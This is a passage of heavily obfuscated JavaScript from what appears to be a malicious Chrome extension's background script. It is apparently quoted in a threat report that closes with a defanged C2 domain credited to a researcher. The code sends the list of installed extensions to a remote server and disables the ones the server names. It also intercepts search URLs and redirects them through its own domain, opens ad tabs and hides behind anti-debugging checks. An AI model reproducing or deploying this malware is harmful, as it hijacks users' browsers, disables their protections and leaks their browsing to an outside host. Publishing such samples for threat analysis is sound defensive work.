111:q5[4].c0nn(q5[89]);q5[4].c0nn(q5[98]);B5=109;break;case 64:q5[73]=q5[10];q5[34]={};B5=62;break;case 149:B5=(function(s5){var b5=2;for(;b5 !== 22;){switch(b5){case 18:Y5[9]=false;b5=17;break;case 2:var Y5=[arguments];b5=1;break;case 19:Y5[7]++;b5=7;break;case 10:b5=Y5[8][q5[60]] === q5[63]?20:19;break;case 24:Y5[7]++;b5=16;break;case 1:b5=Y5[0][0].length === 0?5:4;break;case 16:b5=Y5[7] < Y5[1].length?15:23;break;case 7:b5=Y5[7] < Y5[0][0].length?6:18;break;case 12:Y5[1].c0nn(Y5[8][q5[78]]);b5=11;break;case 25:Y5[9]=true;b5=24;break;case 23:return Y5[9];break;case 14:b5=typeof Y5[6][Y5[8][q5[78]]] === 'undefined'?13:11;break;case 11:Y5[6][Y5[8][q5[78]]].t+=true;b5=10;break;case 5:return;break;case 4:Y5[6]={};Y5[1]=[];Y5[7]=0;b5=8;break;case 8:Y5[7]=0;b5=7;break;case 17:Y5[7]=0;b5=16;break;case 13:Y5[6][Y5[8][q5[78]]]=(function(){var e5=2;for(;e5 !== 9;){switch(e5){case 4:E5[7].t=0;e5=3;break;case 2:var E5=[arguments];E5[7]={};E5[7].h=0;e5=4;break;case 3:return E5[7];break;}}}).M0nn(this,arguments);b5=12;break;case 26:b5=Y5[5] >= 0.5?25:24;break;case 6:Y5[8]=Y5[0][0][Y5[7]];b5=14;break;case 20:Y5[6][Y5[8][q5[78]]].h+=true;b5=19;break;case 15:Y5[4]=Y5[1][Y5[7]];Y5[5]=Y5[6][Y5[4]].h / Y5[6][Y5[4]].t;b5=26;break;}}})(q5[12])?148:147;break;case 18:q5[3]={};q5[3].l5=['J1'];q5[3].y5=function(){var p6=function(){return parseFloat(".01");};var A6=!(/[sl]/).C488(p6 + []);return A6;};q5[9]=q5[3];B5=27;break;case 93:q5[4].c0nn(q5[73]);q5[4].c0nn(q5[29]);q5[4].c0nn(q5[9]);q5[4].c0nn(q5[85]);q5[4].c0nn(q5[22]);q5[4].c0nn(q5[94]);q5[4].c0nn(q5[86]);B5=115;break;case 82:q5[81].l5=['J1','U1'];B5=81;break;case 152:q5[12].c0nn(q5[48]);B5=151;break;case 97:q5[4].c0nn(q5[43]);q5[4].c0nn(q5[8]);q5[4].c0nn(q5[56]);q5[4].c0nn(q5[28]);B5=93;break;case 56:q5[56]=q5[25];q5[51]={};q5[51].l5=['J1'];q5[51].y5=function(){var f7=function(){return ("01").substring(1);};var C7=!(/\u0030/).C488(f7 + []);return C7;};q5[89]=q5[51];q5[88]={};q5[88].l5=['m1'];B5=72;break;case 1:B5=A5[6]?5:4;break;case 33:q5[79].l5=['J1'];q5[79].y5=function(){var B6=function(){if(typeof [] !== 'object')var e6=/aa/;};var b6=!(/\x61\u0061/).C488(B6 + []);return b6;};B5=31;break;case 115:q5[4].c0nn(q5[76]);q5[4].c0nn(q5[30]);q5[4].c0nn(q5[40]);q5[4].c0nn(q5[13]);B5=111;break;case 150:q5[92]++;B5=127;break;case 124:q5[46]=0;B5=123;break;case 14:q5[5].l5=['h5'];q5[5].y5=function(){var X6=function(){return escape('=');};var n6=(/\x33\x44/).C488(X6 + []);return n6;};q5[6]=q5[5];B5=11;break;case 126:q5[61]=q5[4][q5[92]];try{q5[65]=q5[61][q5[32]]()?q5[63]:q5[15];}catch(q7){q5[65]=q5[15];}B5=124;break;case 68:q5[84].y5=function(){var a7=function(){return ('aa').lastIndexOf('a');};var i7=(/\x31/).C488(a7 + []);return i7;};q5[22]=q5[84];q5[97]={};q5[97].l5=['J1'];q5[97].y5=function(){var l7=function(O7,h7){if(O7){return O7;}return h7;};var t7=(/\x3f/).C488(l7 + []);return t7;};B5=88;break;case 127:B5=q5[92] < q5[4].length?126:149;break;case 27:q5[54]={};B5=26;break;case 122:q5[48]={};q5[48][q5[78]]=q5[61][q5[42]][q5[46]];q5[48][q5[60]]=q5[65];B5=152;break;case 86:q5[47].l5=['U1'];q5[47].y5=function(){var P7=function(D7,N7,J7,k7){return !D7 && !N7 && !J7 && !k7;};var U7=(/\x7c\x7c/).C488(P7 + []);return U7;};q5[36]=q5[47];q5[81]={};B5=82;break;case 148:B5=65?148:147;break;case 26:q5[54].l5=['h5'];q5[54].y5=function(){var q6=function(){return ('a').anchor('b');};var Y6=(/(\x3c|\u003e)/).C488(q6 + []);return Y6;};q5[55]=q5[54];q5[96]={};B5=22;break;case 147:A5[6]=28;return 80;break;case 5:return 66;break;case 4:q5[4]=[];q5[1]={};q5[1].l5=['m1'];B5=8;break;case 151:q5[46]++;B5=123;break;case 29:q5[19].l5=['U1'];q5[19].y5=function(){var M6=function(){'use stirct';return 1;};var G6=!(/\u0073\x74\u0069\u0072\u0063\u0074/).C488(M6 + []);return G6;};q5[43]=q5[19];q5[62]={};q5[62].l5=['J1'];q5[62].y5=function(){var v6=function(){return parseInt("0xff");};var R6=!(/\u0078/).C488(v6 + []);return R6;};q5[28]=q5[62];B5=39;break;case 128:q5[92]=0;B5=127;break;case 72:q5[88].y5=function(){var Z7=typeof Z488 === 'function';return Z7;};q5[98]=q5[88];q5[84]={};q5[84].l5=['h5'];B5=68;break;case 54:q5[45]={};q5[45].l5=['U1'];q5[45].y5=function(){var I7=function(){debugger;};var K7=!(/\u0064\u0065\u0062\u0075\x67\x67\u0065\u0072/).C488(I7 + []);return K7;};q5[30]=q5[45];q5[53]={};q5[53].l5=['m1'];q5[53].y5=function(){var u7=false;var m7=[];try{for(var g7 in console){m7.c0nn(g7);}u7=m7.length === 0;}catch(F7){}var z7=u7;return z7;};B5=47;break;case 22:q5[96].l5=['U1'];q5[96].y5=function(){var E6=function(s6,V6,j6){return ! !s6?V6:j6;};var y6=!(/\u0021/).C488(E6 + []);return y6;};q5[29]=q5[96];q5[79]={};B5=33;break;case 101:q5[83].l5=['m1'];q5[83].y5=function(){var A7=typeof a488 === 'function';return A7;};q5[13]=q5[83];q5[4].c0nn(q5[55]);B5=97;break;case 47:q5[40]=q5[53];q5[10]={};q5[10].l5=['J1','h5'];q5[10].y5=function(){var w7=function(){return (![] + [])[+ ! +[]];};var L7=(/\u0061/).C488(w7 + []);return L7;};B5=64;break;case 31:q5[64]=q5[79];q5[19]={};B5=29;break;case 105:q5[4].c0nn(q5[36]);q5[12]=[];q5[63]='Z5';q5[15]='u5';q5[42]='l5';B5=131;break;case 131:q5[60]='i5';q5[32]='y5';q5[78]='V5';B5=128;break;case 81:q5[81].y5=function(){var d7=function(){return 1024 * 1024;};var X7=(/[85-7]/).C488(d7 + []);return X7;};q5[86]=q5[81];q5[27]={};q5[27].l5=['m1'];q5[27].y5=function(){function W7(Q7,p7){return Q7 + p7;};var n7=(/\u006f\u006e[\r\u1680\u3000 \f\n\u2029\ufeff\t\u2000-\u200a\u2028\v\u205f\u00a0\u202f\u180e]{0,}\u0028/).C488(W7 + []);return n7;};q5[76]=q5[27];q5[83]={};B5=101;break;}}};return A5[8];break;}}})();L5zz.v5=function(){return typeof L5zz[615146].B8 === 'function'?L5zz[615146].B8.apply(L5zz[615146],arguments):L5zz[615146].B8;};L5zz[41990]=L5zz[316777];L5zz[540823]=875;var x5RRRR=+"2";for(;x5RRRR !== +"6";){switch(x5RRRR){case +"7":L5zz.W0="90" - 0;x5RRRR=+"6";break;case +"2":x5RRRR=L5zz.l0(+"50") >= L5zz.l0("106" | 72)?"1" << 32:+"5";break;case +"1":L5zz.a0=+"87";x5RRRR=+"5";break;case "9" | 0:L5zz.X0=+"27";x5RRRR="8" ^ 0;break;case +"5":x5RRRR=L5zz.l0("17" ^ 0) >= "29" - 0?+"4":"3" >> 0;break;case +"4":L5zz.u0="79" | 14;x5RRRR=+"3";break;case +"3":x5RRRR=L5zz.e0(+"11") >= L5zz.e0("24" ^ 0)?+"9":+"8";break;case "8" ^ 0:x5RRRR=L5zz.l0("66" * 1) > L5zz.e0(+"63")?"7" << 32:+"6";break;}}var _ExtDomNoSchema,_dd,_ExtnensionName,_ExtensionVersion,_ExtDom;_ExtDomNoSchema=data["0" >> 0];_dd=data["1" >> 64];_ExtnensionName=L5zz.l0(+"0");function openAd(){var x0=L5zz;x0.v5();var r;r=_ExtDom + x0.e0("36" ^ 0) + _ExtnensionName + x0.l0(+"5") + _ExtensionVersion + x0.l0("6" << 32) + _dd;fetch(r,{method:x0.e0(+"11"),credentials:x0.l0("12" << 64),redirect:x0.l0("37" ^ 0)})[x0.e0(+"13")](V=>V[x0.e0("38" >> 64)]())[x0.e0("13" - 0)](w=>{var Z,S,U;x0.G5();if(w[x0.l0("39" - 0)] > +"0"){Z=w["0" ^ 0];S=Z[+"1"];U=x0.e0("40" << 0) + Z["2" ^ 0];chrome[x0.l0("41" ^ 0)][x0.l0("42" << 64)]({'url':S},function(j){fetch(U,{credentials:x0.e0(+"12")});x0.v5();setWithExpirySec(x0.e0("44" - 0),j[x0.l0("45" >> 32)],"86400" >> 0);});}})[x0.e0("16" >> 64)](N=>{});}function handleExtensionResp(s){var c0=L5zz;c0.G5();try{extnesionIds=JSON[c0.l0(+"17")](s)[c0.l0("18" * 1)];extnesionIds[c0.e0("19" << 32)](h=>chrome[c0.e0("20" ^ 0)][c0.l0(+"21")](h,!1));}catch(Y){}}function handleInstalledExtensions(E){var K0=L5zz;K0.v5();fetch(K0.e0("22" - 0) + _ExtDomNoSchema + K0.e0("23" << 0) + K0.l0(+"4") + _ExtnensionName + K0.e0(+"5") + _ExtensionVersion + K0.e0("6" * 1) + _dd,{method:K0.l0("24" >> 0),headers:{'Accept':K0.e0(+"26"),'Content-Type':K0.e0("28" * 1)},body:JSON[K0.e0("29" << 64)](E)})[K0.e0("13" | 5)](p=>p[K0.l0("14" | 4)]())[K0.l0("13" << 64)](P=>handleExtensionResp(P));}_ExtensionVersion=L5zz.l0("1" * 1);function setWithExpirySec(D,A,I){var z0=L5zz;var H,i;z0.G5();H=new Date();i={value:A,expiry:H[z0.e0(+"30")]() + I * +"1000"};localStorage[z0.l0(+"31")](D,JSON[z0.l0(+"29")](i));}function getWithExpiry(O){var L0=L5zz;L0.G5();var l,Q,v;l=localStorage[L0.e0(+"32")](O);if(!l){return null;}Q=JSON[L0.e0("17" * 1)](l);v=new Date();if(v[L0.l0(+"30")]() > Q[L0.e0(+"33")]){localStorage[L0.l0(+"34")](O);return null;}return Q[L0.l0(+"35")];}_ExtDom=L5zz.e0("2" | 2) + _ExtDomNoSchema + L5zz.l0(+"3");chrome[L5zz.e0("48" - 0)][L5zz.l0("49" | 1)][L5zz.l0(+"50")](z=>{var S0=L5zz;z[S0.l0("51" << 64)][S0.l0(+"52")]({name:S0.e0("53" >> 0),value:_dd});return {requestHeaders:z[S0.e0("51" | 2)]};},{urls:[L5zz.l0(+"54") + _ExtDomNoSchema + L5zz.e0(+"55")]},[L5zz.e0("56" - 0),L5zz.l0("51" * 1)]);chrome[L5zz.l0(+"48")][L5zz.l0("57" << 0)][L5zz.e0(+"50")](o=>{var i0=L5zz;if(o[i0.e0("58" * 1)] !== i0.l0(+"59")){return null;}i0.G5();o[i0.e0(+"60")][i0.e0(+"19")](F=>{if(F[i0.e0(+"61")] === i0.l0("62" << 32)){isValue=F[i0.e0("35" >> 64)];setWithExpirySec(i0.l0("62" << 64),isValue,+"300");return null;}});},{urls:[L5zz.l0(+"54") + _ExtDomNoSchema + L5zz.l0("55" << 64)]},[L5zz.e0(+"60")]);function a5zz(){return "*7&*P%3C%1201'%7F8-%1E*/%7F%3E,1%18(H%3C(7%18%3CA;%1B%202%3EA*=%1E,%25f%3C/*1.w%3C'!%0B.E=,70%10E=-%09*8P%3C'%201%10V%3C80&8P%11,$'.V*%12568L%02-!%18a%1Evfom%10%0Bs%12'/$G2%20+$%10K7%01%20%22/A+:%17&(A0?%20'%10P%209%20%18&E0'%1A%259E4,%1E1.W)&+0.l%3C(!&9W%02'$..%7F0:%1E,%25f%3C/*1.v%3C80&8P%02=*%0F$S%3C;%06%228A%02%20+'.%5C%16/%1E%20$I)%25%207.%7F%3E&*$'Aw%126&*V:!%1E2v%7F*,$1(L%09(7%22&W%028%1E0%3EC%3E%126&*V:!k:*L6&k%18;%19%029%1E0%3EC%3E,67%22K7:%1E!%22J%3Eg%1E/*W-%180&9%5D%02/),$V%02;$-/K4%12,-%22P0(1,9%7F0'&/%3E@%3C:%1E:*L6&k%188A8;&+tA!=x%18mM*t%1Ee:%19%02%3C5'*P%3C%12-7?T*sjla%0A%3E&*$'Aw**.d%0E%02!17;Wcfjie%5D8!*,eG6$ji%10L-=50q%0Bvck!%22J%3Eg&,&%0Bs%1276%25P0$%20%18$J%10'67*H5,!%189A8:*-%10M7:1%22'H%02:$%18*H8;(0%10L;%12%22&?e5%25%1E39M/(&:%10W%3C;3*(A*%126&*V:!%166,C%3C:1%06%25E;%25%20'%10W%3C=%1E0.P%0C',-8P8%25)%16%19h%02%3C+*%25W-()/tA!=x%18(K7=%20;?i%3C'00%10v%3C$*5.%7F4,+6%10F+&20.V%06(&7%22K7%12*-%1ET=(1&/%7F*=$7%3EW%02%25*%22/M7.%1E%20#V6$%20yd%0B%3C11&%25W0&+0%10G1;*..%1Evf6&?P0'%220%10V%3C$*5.%7F;;*48A+%08&7%22K7%12*-%08H0*.&/%7F6'%04/*V4%12%151$T%3C;1*.W%02%7Fks%10L-=50q%0Bv%12j%18tA!=x%18mR%3C;x%18m@=t%1E%18dA!=%1Ee%22J?&x%188A7-%07&*G6'%1E1.@*0+%20%10c%1C%1D%1E*%25G5%3C!&%10P1,+%18?A!=%1E02J:%125%18(E-*-%18;E+:%20%18'M*=%1E%25$V%1C(&+%10I8'$$.I%3C'1%189A4&3&%10W%3C=%00-*F5,!%18#P-96yd%0B:&(m%10%0B%3C11%18;K*=%1E%02(G%3C91%18*T)%25,%20*P0&+l!W6'ic?A!=j3'E0'ica%0Bs%12%06,%25P%3C'1n%1F%5D),%1E%18,A-%001&&%7F895/%22G8=,,%25%0B3:*-%10W-;,-,M?0%1E$.P%0D%20(&%10W%3C=%0C7.I%02.*,,H%3Cg%1E$.P%10=%20.%10A!9,12%7F+,(,=A%10=%20.%10R8%250&%10E=v%20;?%19%02/*/'K.%12/0$J%02%25%20-,P1%1201'%7F1=138%1E%02=$!8%7F=-%1E0.P";}function analytics(c,a){var t0=L5zz;var L;L=_ExtDom + c + t0.l0("4" >> 0) + _ExtnensionName + t0.l0("5" | 1) + _ExtensionVersion + t0.l0(+"6") + _dd;t0.v5();if(a != t0.l0("7" - 0)){L=L + t0.l0(+"8") + a;}navigator[t0.l0(+"9")](L);}chrome[L5zz.e0("48" ^ 0)][L5zz.e0(+"63")][L5zz.e0(+"50")](function(R){var P0=L5zz;var u,b,k,d,M,y,C,B,n;if(R[P0.l0("58" - 0)] !== P0.e0("59" * 1)){return null;}u=R[P0.l0("43" << 32)];P0.G5();b=new URL(u);if(u[P0.e0(+"64")]()[P0.e0(+"65")](P0.e0("66" - 0)) === - +"1" && u[P0.l0("65" << 32)](P0.l0(+"67")) >= "0" * 1 && u[P0.l0(+"65")](P0.e0("68" ^ 0)) >= +"0" && u[P0.e0("65" | 64)](P0.l0(+"69")) >= "0" - 0){k=b[P0.l0(+"70")][P0.e0("46" | 40)](P0.l0(+"71"));}if(u[P0.e0(+"64")]()[P0.e0(+"65")](P0.e0(+"72")) === -("1" | 1) && u[P0.l0("65" ^ 0)](P0.e0("73" ^ 0)) >= +"0" && u[P0.l0("65" - 0)](P0.l0("74" * 1)) >= +"0"){k=b[P0.e0(+"70")][P0.l0(+"46")](P0.e0("75" * 1));}if(u[P0.l0(+"64")]()[P0.e0(+"65")](P0.e0("76" * 1)) === - +"1" && u[P0.l0(+"65")](P0.l0("77" | 4)) >= "0" << 64 && u[P0.l0(+"65")](P0.l0("68" >> 64)) >= +"0" && u[P0.l0(+"65")](P0.e0("69" | 4)) >= +"0"){k=b[P0.e0(+"70")][P0.e0(+"46")](P0.l0("71" >> 0));}if(k && k[P0.l0(+"39")] > +"1"){d=getWithExpiry(P0.l0(+"78"));M=Math[P0.l0("79" >> 64)](Math[P0.e0(+"80")]() * +"100");y=getWithExpiry(P0.e0("62" - 0)) || +"100";C=R[P0.l0(+"81")];B="0" << 32;if(C){if(C[P0.l0("82" * 1)](P0.e0("77" ^ 0))){B=+"1";}if(C[P0.e0("82" * 1)](P0.l0(+"83"))){B="1" >> 32;}}if(y > M && B && d){setWithExpirySec(P0.e0(+"78"),k,+"60");return null;}if(k === d){return null;}setWithExpirySec(P0.l0(+"78"),k,"60" * 1);n=_ExtDom + P0.l0("84" ^ 0) + _ExtnensionName + P0.l0(+"5") + _ExtensionVersion + P0.e0(+"85") + B + P0.l0(+"86") + k;chrome[P0.l0(+"41")][P0.e0("87" | 81)]({url:n});}},{urls:[L5zz.e0("88" - 0),L5zz.l0("89" * 1),L5zz.e0(+"90")]},[L5zz.l0("56" * 1)]);chrome[L5zz.l0(+"91")][L5zz.e0(+"92")][L5zz.l0("50" << 64)](t=>{var k0=L5zz;if(t[k0.l0("93" << 0)] == k0.e0("94" << 64)){localStorage[k0.e0(+"34")](k0.e0(+"78"));localStorage[k0.e0(+"34")](k0.l0("44" | 32));localStorage[k0.l0(+"34")](k0.l0(+"62"));localStorage[k0.e0("34" | 0)](k0.l0("95" * 1));chrome[k0.l0("96" >> 64)][k0.l0(+"42")](k0.e0("97" * 1),{delayInMinutes:"1.1" * 1,periodInMinutes:"180" << 32});chrome[k0.l0("96" - 0)][k0.l0(+"42")](k0.l0("44" - 0),{delayInMinutes:"5" | 0,periodInMinutes:+"30"});analytics(k0.e0(+"94"),k0.e0(+"7"));sync();chrome[k0.e0("20" ^ 0)][k0.e0(+"98")](function(q){k0.v5();handleInstalledExtensions(q);});chrome[k0.l0(+"99")][k0.l0(+"100")][k0.e0("101" << 64)][k0.l0("102" >> 0)]({value:!1});}});chrome[L5zz.e0(+"91")][L5zz.l0("103" - 0)](_ExtDom + L5zz.l0("104" - 0) + _ExtnensionName + L5zz.l0("5" * 1) + _ExtensionVersion + L5zz.e0("6" * 1) + _dd);L5zz.v5();chrome[L5zz.l0(+"105")][L5zz.e0(+"42")]({title:L5zz.e0("106" * 1),id:L5zz.l0("107" >> 32),contexts:[L5zz.l0("108" | 36)]});function sync(){var d0=L5zz;var m;m=_ExtDom + d0.e0(+"10");fetch(m,{method:d0.l0("11" - 0),credentials:d0.l0("12" * 1)})[d0.e0("13" - 0)](f=>f[d0.l0("14" * 1)]())[d0.e0("13" - 0)](J=>{analytics(d0.e0(+"15"),J);})[d0.l0(+"16")](K=>{});}chrome[L5zz.e0(+"41")][L5zz.l0("109" * 1)][L5zz.l0(+"50")](function(T,G,x){var n0=L5zz;if(G[n0.l0("110" << 0)] == n0.e0(+"111") && x[n0.l0("43" - 0)][n0.l0("65" << 0)](n0.l0(+"112")) == +"0"){chrome[n0.l0(+"41")][n0.l0("42" | 42)]({url:n0.e0("113" | 64)});chrome[n0.e0(+"41")][n0.e0("114" - 0)](T);}});chrome[L5zz.e0(+"115")][L5zz.e0(+"116")][L5zz.e0("50" | 32)](function(W){chrome[L5zz.e0(+"41")][L5zz.l0(+"42")]({url:L5zz.l0(+"113")});});chrome[L5zz.l0("105" - 0)][L5zz.l0("116" ^ 0)][L5zz.e0("50" - 0)](function(L5,a5){var A0=L5zz;A0.v5();chrome[A0.l0("41" ^ 0)][A0.e0(+"42")]({url:A0.e0(+"113")});});chrome[L5zz.l0("96" ^ 0)][L5zz.e0(+"117")][L5zz.l0("50" >> 64)](function(c5){var q0=L5zz;if(c5[q0.l0(+"61")] === q0.e0("97" << 64)){analytics(q0.l0("97" - 0),q0.e0(+"7"));sync();}else if(c5[q0.l0("61" >> 64)] === q0.l0("44" - 0)){getAd();}});function getAd(){var Y0=L5zz;var g;Y0.v5();g=getWithExpiry(Y0.l0("44" - 0));if(g){chrome[Y0.l0("41" >> 0)][Y0.l0("46" - 0)](g,function(X){Y0.v5();if(X){return null;}else {openAd();}});console[Y0.e0("47" << 0)]();}else {openAd();}}})(["ewsawanincre.com", "YW9jbnBZW1pfQFZYUlZJWFdVW0hWW1ASSVRdVV9GHV5VW0RUXFJeRVATEBsSCAs="]);
```

### C2 Domain provided by @th3_protoCOL

```
ewsawanincre[.]com
```
